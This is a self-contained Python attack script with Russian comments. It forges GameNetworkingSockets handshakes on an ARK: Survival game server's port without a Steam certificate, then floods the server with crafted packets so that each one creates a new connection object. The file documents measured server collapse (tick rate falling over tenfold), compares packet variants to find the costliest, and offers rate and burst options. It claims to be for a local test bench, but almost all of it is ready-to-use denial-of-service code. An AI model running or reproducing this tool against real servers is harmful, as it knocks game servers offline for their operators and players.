# -*- coding: utf-8 -*-
"""
ark_lab_gns_amp.py — главный вектор: подделка транспортной сессии
SteamNetworkingSockets (GNS) на игровом порту ARK -> «1 пакет = 1 UNetConnection».

ФАЙЛ САМОДОСТАТОЧНЫЙ: использует только стандартную библиотеку Python,
его можно скопировать на любой хост и запустить как есть. Метрики читаются
с серверного плагина NetGuard по TCP (127.0.0.1:27101) - если плагина нет,
скрипт всё равно работает, просто не покажет TPS.

------------------------------------------------------------------
Что делает атака (всё подтверждено измерениями на стенде ARK v358):

  1. Транспорт игрового порта 7778 - listen-socket опенсорсного
     GameNetworkingSockets (DirectUDP). Рукопожатие из двух стадий,
     и обе - без Steam-сертификата (настоящий клиент ARK тоже шлёт
     ConnectRequest без cert и без crypt):

        0x20 ChallengeRequest  [0x20][u16 len][protobuf][pad до 512 Б]
                              -> 0x21 ChallengeReply  [0x21][protobuf]
        0x22 ConnectRequest    [0x22][protobuf]
                              -> 0x23 ConnectOK      [0x23][protobuf]

     challenge = SipHash(nTime, порт, IP) | nTime; секрет случайный,
     но challenge выдаёт сам сервер, поэтому достаточно продублировать
     его обратно с того же адреса (живёт ~4 с).

  2. Дальше - data-пакеты GNS:
        [0x80][u32 to_connection_id][u16 seq]     UDPDataMsgHdr (7 Б)
        [0x37][u32 msg_num][данные]              SNP-кадр (unreliable segment)
     Содержимое сегмента = байты UE4-пакета дословно.

  3. Каждый такой UE4-пакет сервер трактует как новый stateless-connect:
     создаётся новый UNetConnection (NotifyAcceptingConnection).
     То есть N пакетов = N объектов соединений на сервере.

Измерено (стенд Server2, 192.168.8.218):
     ~26 000 пакетов/с  ->  TPS 21.7 -> 0.4 (падение в 10+ раз)
     80 000 пакетов     ->  обвал начинается (TPS 21.1 -> 13.8)
     340 000 пакетов    ->  340 000 UNetConnection, 98 % деградации
     восстановление сервера после остановки - 15-20 с

------------------------------------------------------------------
Примеры:

    # одиночный залп 200 000 пакетов с замером воздействия
    python ark_lab_gns_amp.py --count 200000

    # ограничить темп (например, 5000 пакетов/с на 20 секунд)
    python ark_lab_gns_amp.py --rate 5000 --duration 20

    # ступенчатый режим: измерить «цену» атаки (сколько пакетов до обвала)
    python ark_lab_gns_amp.py --stepped --burst 20000 --duration 60

    # без плагина метрик (просто проверить, что сессия подделывается)
    python ark_lab_gns_amp.py --count 1000 --no-metrics

Только локальный стенд (по условию задачи - свой собственный).
"""
from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
import time

# ---------------------------------------------------------------------------
# Константы протокола GNS
# ---------------------------------------------------------------------------
MSG_CHALLENGE_REQUEST = 32      # 0x20  клиент -> сервер
MSG_CHALLENGE_REPLY = 33        # 0x21  сервер -> клиент
MSG_CONNECT_REQUEST = 34        # 0x22  клиент -> сервер
MSG_CONNECT_OK = 35             # 0x23  сервер -> клиент
MSG_CONNECTION_CLOSED = 36      # 0x24
MSG_NO_CONNECTION = 37          # 0x25

MSG_NAMES = {
    32: "ChallengeRequest", 33: "ChallengeReply", 34: "ConnectRequest",
    35: "ConnectOK", 36: "ConnectionClosed", 37: "NoConnection",
}

# Первый UE4-пакет настоящего клиента (статeless-connect challenge request).
# 4 байта - префикс соединения UE4 (произвольный, сервер его не проверяет),
# далее 2-байтовый partial-заголовок UE4.
DEFAULT_UE4_PREFIX = "5b17b519"
DEFAULT_UE4_FIRST = "0140"

# Единица времени GNS: usecNow >> 20 (~1.05 с). challenge = f(время, порт, IP).
GNS_TIME_UNIT_SHIFT = 20


# ---------------------------------------------------------------------------
# Минимальный protobuf (wire-формат), без внешних зависимостей
# ---------------------------------------------------------------------------
def _varint(v: int) -> bytes:
    out = bytearray()
    while True:
        b = v & 0x7F
        v >>= 7
        out.append(b | (0x80 if v else 0))
        if not v:
            return bytes(out)


def _tag(field: int, wire: int) -> bytes:
    return _varint((field << 3) | wire)


def _f32(field: int, v: int) -> bytes:
    return _tag(field, 5) + struct.pack("<I", v & 0xFFFFFFFF)


def _f64(field: int, v: int) -> bytes:
    return _tag(field, 1) + struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _u32(field: int, v: int) -> bytes:
    return _tag(field, 0) + _varint(v)


def _read_varint(buf: bytes, i: int) -> tuple[int, int]:
    shift = 0
    val = 0
    while i < len(buf):
        c = buf[i]
        i += 1
        val |= (c & 0x7F) << shift
        if not (c & 0x80):
            return val, i
        shift += 7
    return val, i


def parse_pb(buf: bytes) -> dict[int, list]:
    """Разбор protobuf -> {номер_поля: [значения]}. Значения: int или bytes."""
    out: dict[int, list] = {}
    i = 0
    n = len(buf)
    while i < n:
        key, i = _read_varint(buf, i)
        field, wire = key >> 3, key & 7
        if field == 0:
            break
        if wire == 0:
            v, i = _read_varint(buf, i)
        elif wire == 1:
            v = int.from_bytes(buf[i:i + 8], "little")
            i += 8
        elif wire == 2:
            ln, i = _read_varint(buf, i)
            v = buf[i:i + ln]
            i += ln
        elif wire == 5:
            v = int.from_bytes(buf[i:i + 4], "little")
            i += 4
        else:
            break
        out.setdefault(field, []).append(v)
    return out


# ---------------------------------------------------------------------------
# Кадры GNS
# ---------------------------------------------------------------------------
def challenge_request_frame(connection_id: int, timestamp: int, version: int = 5,
                             pad_to: int = 512) -> bytes:
    """[0x20][u16 len][protobuf][padding до 512 Б].

    protobuf CMsgSteamSockets_UDP_ChallengeRequest:
        1 connection_id (fixed32), 3 my_timestamp (fixed64), 4 protocol_version (uint32)
    Padding обязателен: сервер отбрасывает кадр короче 512 байт
    ("must be padded to at least 512 bytes").
    """
    pb = _f32(1, connection_id) + _f64(3, timestamp) + _u32(4, version)
    out = bytearray([MSG_CHALLENGE_REQUEST]) + struct.pack("<H", len(pb)) + pb
    if len(out) < pad_to:
        out += b"\x00" * (pad_to - len(out))
    return bytes(out)


def connect_request_frame(client_connection_id: int, challenge: int, timestamp: int,
                          version: int = 5, legacy_steam_id: int = 0) -> bytes:
    """[0x22][protobuf] (без длины и без padding).

    protobuf CMsgSteamSockets_UDP_ConnectRequest:
        1 client_connection_id (fixed32), 2 challenge (fixed64),
        3 legacy_client_steam_id (fixed64), 5 my_timestamp (fixed64),
        8 legacy_protocol_version (uint32)
    """
    pb = _f32(1, client_connection_id)
    pb += _f64(2, challenge)
    if legacy_steam_id:
        pb += _f64(3, legacy_steam_id)
    pb += _f64(5, timestamp)
    pb += _u32(8, version)
    return bytes([MSG_CONNECT_REQUEST]) + pb


def build_body_template(variant: str, payload: bytes) -> bytes:
    """Тело data-пакета без 7-байтового заголовка - собирается один раз.

    Это нужно, чтобы отправитель не упирался в Python: на каждом пакете
    патчится только заголовок (to_connection_id + seq).
    """
    if variant == "unreliable":
        return b"\x37" + struct.pack("<I", 1) + payload
    if variant == "unreliable-x10":
        return b"".join(b"\x37" + struct.pack("<I", 1 + i) + payload for i in range(10))
    if variant == "reliable":
        return (bytes([0x40]) + (1).to_bytes(3, "little")
                + bytes([len(payload) & 0xFF]) + payload)
    if variant == "reliable-x10":
        return b"".join(bytes([0x40]) + (1 + i).to_bytes(3, "little")
                        + bytes([len(payload) & 0xFF]) + payload for i in range(10))
    if variant == "ack":
        return b"\x90" + struct.pack("<H", 1)
    if variant == "blob":
        return b"\x37" + struct.pack("<I", 1) + payload
    if variant == "mixed":
        return (b"\x37" + struct.pack("<I", 1) + payload
                + b"\x40" + (1).to_bytes(3, "little")
                + bytes([len(payload) & 0xFF]) + payload
                + b"\x90" + struct.pack("<H", 1))
    raise ValueError("неизвестный вариант: %s" % variant)


def gns_data(to_connection_id: int, seq: int, msg_num: int, payload: bytes) -> bytes:
    """Data-пакет GNS: UDPDataMsgHdr + SNP-кадр (unreliable segment).

        [0x80][u32 to_connection_id][u16 seq][0x37][u32 msg_num][payload]
    0x37: (lead & 0xc0) == 0  -> unreliable segment
          (lead & 0x10)        -> 32-битный абсолютный номер сообщения
          (lead & 7)  == 7     -> размер сегмента = остаток пакета
    """
    hdr = b"\x80" + struct.pack("<IH", to_connection_id & 0xFFFFFFFF, seq & 0xFFFF)
    frame = b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload
    return hdr + frame


# --- варианты data-пакета (стоимость обработки измерена по CPU процесса) ------
# unreliable   - базовый, 1 unreliable-кадр            ~21-25 мкс/пакет
# unreliable-x10- 10 unreliable-кадров в пакете        ~29 мкс/пакет
# reliable     - надёжный SNP-кадр 0x40                ~20 мкс/пакет
# reliable-x10 - 10 надёжных кадров в пакете           ~40 мкс/пакет (САМЫЙ ДОРОГОЙ)
# ack          - ack-кадр 0x90 (обновление счётчиков)  ~28 мкс/пакет
# blob         - флаг 0x81 + inline protobuf           ~23 мкс/пакет
# mixed        - unreliable + reliable + ack в одном    ~21 мкс/пакет
VARIANTS = ("unreliable", "unreliable-x10", "reliable", "reliable-x10",
            "ack", "blob", "mixed")


def build_packet(variant: str, to_connection_id: int, seq: int, msg_num: int,
                 payload: bytes) -> bytes:
    """Собирает data-пакет выбранного варианта."""
    hdr = b"\x80" + struct.pack("<IH", to_connection_id & 0xFFFFFFFF, seq & 0xFFFF)
    if variant == "unreliable":
        return hdr + b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload
    if variant == "unreliable-x10":
        return hdr + b"".join(b"\x37" + struct.pack("<I", (msg_num + i) & 0xFFFFFFFF) + payload
                              for i in range(10))
    if variant == "reliable":
        return (hdr + bytes([0x40]) + (msg_num & 0xFFFFFF).to_bytes(3, "little")
                + bytes([len(payload) & 0xFF]) + payload)
    if variant == "reliable-x10":
        return hdr + b"".join(
            bytes([0x40]) + ((msg_num + i) & 0xFFFFFF).to_bytes(3, "little")
            + bytes([len(payload) & 0xFF]) + payload for i in range(10))
    if variant == "ack":
        return hdr + b"\x90" + struct.pack("<H", msg_num & 0xFFFF)
    if variant == "blob":
        hdr81 = b"\x81" + struct.pack("<IH", to_connection_id & 0xFFFFFFFF, seq & 0xFFFF)
        return hdr81 + b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload
    if variant == "mixed":
        return (hdr
                + b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload
                + b"\x40" + (msg_num & 0xFFFFFF).to_bytes(3, "little")
                + bytes([len(payload) & 0xFF]) + payload
                + b"\x90" + struct.pack("<H", msg_num & 0xFFFF))
    raise ValueError("неизвестный вариант: %s" % variant)


# ---------------------------------------------------------------------------
# Метрики сервера (плагин NetGuard, TCP 127.0.0.1:27101, JSON построчно)
# ---------------------------------------------------------------------------
class Metrics:
    """Клиент JSON-интерфейса NetGuard. Необязателен: при ошибке отключается."""

    def __init__(self, host: str = "127.0.0.1", port: int = 27101, timeout: float = 5.0):
        self.host, self.port, self.timeout = host, port, timeout
        self.sock: socket.socket | None = None

    def connect(self) -> "Metrics":
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)
        return self

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def status(self) -> dict:
        if self.sock is None:
            self.connect()
        assert self.sock is not None
        self.sock.sendall(b"status\n")
        buf = b""
        while b"\n" not in buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise RuntimeError("плагин закрыл соединение")
            buf += chunk
        return json.loads(buf.split(b"\n", 1)[0].decode("utf-8", "replace"))

    def safe_status(self) -> dict:
        try:
            return self.status()
        except Exception:  # noqa: BLE001
            return {}


# ---------------------------------------------------------------------------
# Предварительная проверка доступности сервера
# ---------------------------------------------------------------------------
A2S_INFO = b"\xff\xff\xff\xffTSource Engine Query\x00"
A2S_PLAYER = b"\xff\xff\xff\xffU"


def a2s_ping(host: str, port: int, timeout: float = 2.0) -> dict:
    """A2S-пинг query-порта: сервер жив? (мягкая проверка, ничего не портит)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(A2S_INFO, (host, port))
        data, _ = s.recvfrom(4096)
        return {"ok": True, "bytes": len(data), "raw": data}
    except socket.timeout:
        return {"ok": False, "reason": "таймаут %.1f с" % timeout}
    except OSError as exc:
        return {"ok": False, "reason": "ошибка сокета: %s" % exc}
    finally:
        s.close()


def gns_ping(host: str, port: int, timeout: float = 2.0) -> dict:
    """Проверка игрового порта: сервер отвечает на ChallengeRequest?

    Это и есть «живой» признак игрового порта: ответ приходит мгновенно,
    состояние на сервере не создаётся (в отличие от ConnectRequest).
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        ts = int(time.time() * 1000) & 0xFFFFFFFFFFFF
        s.sendto(challenge_request_frame(0x11223344, ts), (host, port))
        data, _ = s.recvfrom(4096)
        if data[0] == MSG_CHALLENGE_REPLY:
            f = parse_pb(data[1:])
            return {"ok": True, "bytes": len(data),
                    "challenge": (f.get(2) or [0])[0],
                    "protocol_version": (f.get(4) or [0])[0]}
        return {"ok": False, "reason": "неожиданный ответ 0x%02x (%s)"
                % (data[0], MSG_NAMES.get(data[0], "?"))}
    except socket.timeout:
        return {"ok": False, "reason": "таймаут %.1f с" % timeout}
    except OSError as exc:
        return {"ok": False, "reason": "ошибка сокета: %s" % exc}
    finally:
        s.close()


def check_server(host: str, game_port: int, query_port: int = 27016,
                  metrics_host: str = "127.0.0.1", metrics_port: int = 27101,
                  timeout: float = 2.0, metrics=None) -> dict:
    """Проверка доступности сервера перед атакой.

    Три независимые проверки:
      * query-порт (A2S)   - сервер вообще жив;
      * игровой порт (GNS) - слушает ли сокет GNS (это цель атаки);
      * плагин метрик       - сможем ли измерить эффект (не обязателен).
    metrics - готовый клиент метрик (плагин держит одно TCP-соединение,
    поэтому если клиент уже есть, второй не создаём).
    Возвращает словарь с результатами; поле 'fatal' - можно ли продолжать.
    """
    res = {
        "a2s": a2s_ping(host, query_port, timeout) if query_port else {"ok": None, "reason": "пропущено"},
        "gns": gns_ping(host, game_port, timeout),
        "metrics": {"ok": None, "reason": "пропущено"},
    }
    own = False
    met = metrics
    if met is None:
        try:
            met = Metrics(metrics_host, metrics_port, timeout=timeout).connect()
            own = True
        except Exception:  # noqa: BLE001
            met = None
    if met is not None:
        try:
            st = met.status()
            res["metrics"] = {"ok": True, "tps": st.get("tps"), "pid": st.get("pid"),
                              "uptime": st.get("uptimeSec")}
        except Exception as exc:  # noqa: BLE001
            res["metrics"] = {"ok": False, "reason": str(exc)}
        finally:
            if own:
                met.close()
    res["fatal"] = not res["gns"]["ok"]
    return res


def print_check(res: dict) -> None:
    """Печать отчёта о проверке доступности."""
    print("-" * 96)
    print("ПРОВЕРКА ДОСТУПНОСТИ СЕРВЕРА")
    a = res.get("a2s", {})
    if a.get("ok") is None:
        print("  query-порт (A2S)   : пропущено")
    elif a.get("ok"):
        raw = a.get("raw") or b""
        preview = "".join(chr(c) if 32 <= c < 127 else "." for c in raw[:48])
        print("  query-порт (A2S)   : ОТВЕТИЛ, %d Б [%s]" % (a.get("bytes", 0), preview))
    else:
        print("  query-порт (A2S)   : не отвечает (%s)" % a.get("reason"))
    g = res.get("gns", {})
    if g.get("ok"):
        print("  игровой порт (GNS) : ОТВЕТИЛ, challenge=0x%016x, протокол V%s"
              % (g.get("challenge", 0), g.get("protocol_version", "?")))
    else:
        print("  игровой порт (GNS) : НЕ ОТВЕЧАЕТ (%s)" % g.get("reason"))
    mm = res.get("metrics", {})
    if mm.get("ok") is None:
        print("  плагин метрик      : пропущено")
    elif mm.get("ok"):
        print("  плагин метрик      : доступен (pid=%s, tps=%s, uptime=%s)"
              % (mm.get("pid"), mm.get("tps"), mm.get("uptime")))
    else:
        print("  плагин метрик      : недоступен (%s) - атака возможна, но без замеров" % mm.get("reason"))
    print("-" * 96)


# ---------------------------------------------------------------------------
# Ядро атаки
# ---------------------------------------------------------------------------
def forge_session(host: str, game_port: int, sock: socket.socket,
                  verbose: bool = True) -> int:
    """Проходит обе стадии GNS-рукопожатия, возвращает server_connection_id.

    Без Steam-аккаунта, без сертификата, без криптографии.
    """
    # --- стадия 1: ChallengeRequest -> ChallengeReply
    ts = int(time.time() * 1000) & 0xFFFFFFFFFFFF
    sock.sendto(challenge_request_frame(0x11223344, ts), (host, game_port))
    data, _ = sock.recvfrom(4096)
    if data[0] != MSG_CHALLENGE_REPLY:
        raise RuntimeError("сервер не ответил ChallengeReply (lead=0x%02x)" % data[0])
    challenge = (parse_pb(data[1:]).get(2) or [0])[0]
    if verbose:
        print("  <- ChallengeReply challenge=0x%016x" % challenge)

    # --- стадия 2: ConnectRequest -> ConnectOK
    cc_id = 0x10000000 + (int(time.time() * 1000) & 0x0FFFFFFF)
    sock.sendto(connect_request_frame(cc_id, challenge, int(time.time() * 1000) & 0xFFFFFFFFFFFF),
                (host, game_port))
    data, _ = sock.recvfrom(4096)
    if data[0] != MSG_CONNECT_OK:
        raise RuntimeError("сервер не принял ConnectRequest (lead=0x%02x %s)"
                           % (data[0], MSG_NAMES.get(data[0], "?")))
    f = parse_pb(data[1:])
    srv_conn_id = (f.get(5) or [0])[0]      # поле 5 = server_connection_id
    if verbose:
        print("  <- ConnectOK server_connection_id=0x%08x" % srv_conn_id)
    return srv_conn_id


def run_amp(host: str = "192.168.8.218", game_port: int = 7778,
            metrics_host: str = "127.0.0.1", metrics_port: int = 27101,
            count: int = 200000, rate: float = 0.0, duration: float = 0.0,
            prefix: str = DEFAULT_UE4_PREFIX, ue4_first: str = DEFAULT_UE4_FIRST,
            stepped: bool = False, burst: int = 20000,
            use_metrics: bool = True, metrics=None, verbose: bool = True,
            check: bool = True, query_port: int = 27016, check_timeout: float = 2.0,
            variant: str = "unreliable") -> dict:
    """Основной сценарий: подделать сессию и отправить N поддельных UE4-пакетов.

    stepped=False - непрерывный поток (пиковый ущерб);
    stepped=True  - залпы по `burst` пакетов с паузой (измерение «цены» атаки).
    metrics       - готовый клиент метрик (у плагина NetGuard держится одно
                    TCP-соединение, поэтому снаружи его передавать нельзя).
    check         - перед атакой проверить доступность сервера (по умолчанию да).
    """
    if check:
        res = check_server(host, game_port, query_port=query_port,
                           metrics_host=metrics_host, metrics_port=metrics_port,
                           timeout=check_timeout, metrics=metrics)
        if verbose:
            print_check(res)
        if res.get("fatal"):
            raise RuntimeError("сервер недоступен: игровой порт %s:%d не отвечает (%s)"
                               % (host, game_port, res["gns"].get("reason")))

    own_client = False
    met = metrics
    if use_metrics and met is None:
        try:
            met = Metrics(metrics_host, metrics_port).connect()
            own_client = True
        except OSError:
            if verbose:
                print("  (плагин метрик недоступен - продолжаю без замеров)")
            met = None

    def snap() -> dict:
        if met is None:
            return {}
        try:
            return met.status()
        except Exception:  # noqa: BLE001
            return {}

    before = snap()
    tps0 = float(before.get("tps") or 0.0)
    att0 = int(before.get("connectionAttempts") or 0)
    mem0 = int(before.get("memKB") or 0)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    sock.bind(("0.0.0.0", 0))
    if verbose:
        print("  наш адрес: %s:%d" % sock.getsockname())
    try:
        srv_conn_id = forge_session(host, game_port, sock, verbose)
    except Exception:
        sock.close()
        if met:
            met.close()
        raise

    payload = bytes.fromhex(prefix) + bytes.fromhex(ue4_first)
    body_tpl = build_body_template(variant, payload)
    hdr_tpl = b"\x80" + struct.pack("<IH", srv_conn_id & 0xFFFFFFFF, 0)
    sent = 0
    t0 = time.time()
    steps: list[tuple[int, float]] = []
    tps_min = tps0
    interval = 1.0 / rate if rate > 0 else 0.0
    next_t = t0

    while True:
        now = time.time()
        if duration > 0 and now - t0 >= duration:
            break
        if count > 0 and sent >= count:
            break
        if interval:
            if now < next_t:
                time.sleep(min(next_t - now, 0.05))
                next_t += interval
        if stepped:
            for _ in range(burst):
                if count > 0 and sent >= count:
                    break
                try:
                    sock.sendto(build_packet(variant, srv_conn_id, (sent + 1) & 0xFFFF,
                                             (sent + 1) & 0xFFFFFFFF, payload), (host, game_port))
                except OSError:
                    pass
                sent += 1
            time.sleep(1.2)                      # ждём обновления метрики
            tps = float(snap().get("tps") or 0.0)
            tps_min = min(tps_min, tps)
            steps.append((sent, tps))
            if verbose:
                print("    пакетов=%-8d TPS=%s" % (sent, tps))
            if tps0 > 0 and tps <= tps0 * 0.25:
                break
        else:
            for _ in range(2000):
                if count > 0 and sent >= count:
                    break
                try:
                    sock.sendto(hdr_tpl[:5] + struct.pack("<H", (sent + 1) & 0xFFFF) + body_tpl,
                                (host, game_port))
                except OSError:
                    pass
                sent += 1
            if sent % 20000 == 0:
                s = snap()
                tps = float(s.get("tps") or 0.0)
                tps_min = min(tps_min, tps)
                steps.append((sent, tps))
                if verbose:
                    print("    пакетов=%-8d pps=%-7.0f TPS=%-6s connAttempts=%s" % (
                        sent, sent / max(1e-6, time.time() - t0), s.get("tps"),
                        s.get("connectionAttempts")))
    sock.close()
    dt = max(1e-6, time.time() - t0)

    # ущерб виден не сразу: метрика TPS обновляется на игровом тике
    time.sleep(2.0)
    tps_after = snap().get("tps")
    time.sleep(3.0)
    tps_after5 = snap().get("tps")
    after = snap()

    half_at = None
    for n, tps in steps:
        if tps0 > 0 and tps <= tps0 * 0.5:
            half_at = n
            break

    result = {
        "packets": sent,
        "pps": sent / dt,
        "seconds": dt,
        "tps0": tps0,
        "tps_min": tps_min,
        "tps_after": tps_after,
        "tps_after5": tps_after5,
        "half_at": half_at,
        "steps": steps,
        "stepped": stepped,
        "conn_delta": int(after.get("connectionAttempts") or 0) - att0,
        "mem_delta_kb": int(after.get("memKB") or 0) - mem0,
    }
    if met and own_client:
        met.close()
    return result


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Подделка GNS-сессии ARK: 1 пакет = 1 UNetConnection (DoS-вектор)")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-host", default="127.0.0.1")
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=200000, help="сколько поддельных пакетов")
    ap.add_argument("--rate", type=float, default=0.0, help="пакетов/с (0 = максимум)")
    ap.add_argument("--duration", type=float, default=0.0, help="ограничение по времени, с (0 = нет)")
    ap.add_argument("--stepped", action="store_true", help="залпы с паузой (измерение 'цены' атаки)")
    ap.add_argument("--burst", type=int, default=20000, help="размер залпа в --stepped")
    ap.add_argument("--prefix", default=DEFAULT_UE4_PREFIX, help="4-байтовый префикс UE4-соединения")
    ap.add_argument("--variant", choices=VARIANTS, default="unreliable",
                    help="вариант data-пакета GNS (стоимость обработки измерена, см. §16.3 отчёта)")
    ap.add_argument("--no-metrics", action="store_true", help="не опрашивать плагин метрик")
    ap.add_argument("--query-port", type=int, default=27016, help="порт Steam-query для проверки живости")
    ap.add_argument("--check-timeout", type=float, default=2.0, help="таймаут проверок, с")
    ap.add_argument("--skip-check", action="store_true", help="не проверять доступность сервера")
    ap.add_argument("--json", default="", help="сохранить результат в JSON")
    args = ap.parse_args()

    print("=" * 96)
    print("ARK GNS-амплификатор: подделка транспортной сессии -> 1 пакет = 1 UNetConnection")
    print("цель: %s:%d   (метрики: %s:%d)" % (args.host, args.game_port,
                                               args.metrics_host, args.metrics_port))
    print("=" * 96)
    try:
        r = run_amp(host=args.host, game_port=args.game_port,
                    metrics_host=args.metrics_host, metrics_port=args.metrics_port,
                    count=args.count, rate=args.rate, duration=args.duration,
                    prefix=args.prefix, stepped=args.stepped, burst=args.burst,
                    use_metrics=not args.no_metrics, variant=args.variant,
                    check=not args.skip_check, query_port=args.query_port,
                    check_timeout=args.check_timeout)
    except RuntimeError as exc:
        print("ОТКАЗ: %s" % exc)
        return 3
    print("-" * 96)
    print("отправлено пакетов : %d" % r["packets"])
    print("темп                : %.0f pps (%.1f с)" % (r["pps"], r["seconds"]))
    print("соединений создано  : %+d" % r["conn_delta"])
    print("TPS                 : было %s, во время %s, после %s (+5с %s)" % (
        r["tps0"], r["tps_min"], r["tps_after"], r["tps_after5"]))
    if r["tps0"]:
        print("мощность            : %.0f %%" % (max(0.0, (r["tps0"] - min(
            v for v in (r["tps_min"], r["tps_after"], r["tps_after5"]) if v is not None)) / r["tps0"]) * 100))
    if r["half_at"] is not None:
        print("цена атаки          : обвал до 50%% TPS на %d пакетах" % r["half_at"])
    print("память сервера      : %+d КБ" % r["mem_delta_kb"])
    print("=" * 96)
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(r, f, ensure_ascii=False, indent=2)
        print("результат сохранён: %s" % args.json)
    return 0


if __name__ == "__main__":
    sys.exit(main())
